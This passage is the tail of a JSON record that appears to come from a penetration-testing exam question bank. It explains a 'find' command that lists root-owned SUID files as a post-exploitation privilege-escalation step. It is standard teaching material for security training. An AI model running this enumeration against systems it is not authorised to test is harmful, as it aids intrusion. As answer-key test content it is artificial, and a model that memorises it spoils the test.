      "explanation": "The command find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null is used to find files with the SUID \nbit set. SUID (Set User ID) permissions allow a file to be executed with the permissions of the file owner \n(root), rather than the permissions of the user running the file.\n\nUnderstanding the Command:\n\nfind /: Search the entire filesystem.\n\n-user root: Limit the search to files owned by the root user.\n\n-perm -4000: Look for files with the SUID bit set.\n\n-exec ls -ldb {} \\;: Execute ls -ldb on each found file to list it in detail.\n\n2>/dev/null: Redirect error messages to /dev/null to avoid cluttering the output.\n\nPurpose:\n\nEnumerating SUID Files: The command is used to identify files with elevated privileges that \nmight be exploited for privilege escalation.\n\nSecurity Risks: SUID files can pose security risks if they are vulnerable, as they can be used to \nexecute code with root privileges.\n\nWhy Enumerate Permissions:\n\nIdentifying SUID files is a crucial step in privilege escalation as it reveals potential attack vectors \nthat can be exploited to gain root access.\n\nReferences from Pentesting Literature:\n\nEnumeration of SUID files is a common practice in penetration testing, as discussed in various \nguides and write-ups.\n\nHTB write-ups often detail how finding and exploiting SUID binaries can lead to root access on a \ntarget system.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups\n=================",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    }
]